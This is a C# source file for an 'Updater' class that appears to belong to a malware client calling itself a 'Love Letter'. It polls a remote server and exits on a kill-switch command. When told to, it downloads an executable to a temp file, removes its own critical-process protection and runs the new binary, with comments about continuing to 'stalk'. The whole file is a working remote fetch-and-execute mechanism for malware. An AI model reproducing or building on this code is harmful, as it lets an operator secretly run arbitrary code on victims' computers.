using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Utilities
{
    /// <summary>
    /// A class that checks for updates every 30 seconds.
    /// </summary>
    public class Updater
    {
        private System.Timers.Timer _refreshtimer;
        private float FetchedVersion = 0f;
        public void Start()
        {
            FetchUpdates();
        }

        public async void FetchUpdates()
        {
            await Task.Run(() =>
            {
                Communication.JSON_Models.Update update = null;

                // necessary since the user might have bad internet
                do
                {
                    update = Communication.Server.GetUpdate();
                    // prevent cpu usage spike when user doesnt have internet
                    Thread.Sleep(100);
                } while (update == null);

                if (update != null)
                {
                    // check if the letter is supposed to kill itself.
                    if (update.KillSelf) Environment.Exit(69);

                    if (update.LetterVersion > Constants.Version)
                    {
                        DownloadAndRunNewLetter(update.DownloadLink);
                    }
                }
            });
        }

        /// <summary>
        /// Downloads the newest letter.
        /// </summary>
        public async void DownloadAndRunNewLetter(string link)
        {
            string target_filename = Path.GetTempFileName() + ".exe";

            target_filename =
                await Communication.Server.AsyncDownloadFile(link, target_filename);

            if (!string.IsNullOrEmpty(target_filename))
            {
                // unprotect (very dangerous)
                if (Armitage.Critical_Process.IsProtected)
                    Armitage.Critical_Process.Unprotect();

                try
                {
                    Process.Start(target_filename, Constants.MyProcessID.ToString());
                    // wait for 10 seconds, wait until the new Love Letter
                    // do its thing
                    Thread.Sleep(10 * 1000);
                }
                catch { }
            }
            // if nothing happened just continue stalking
        }
    }
}
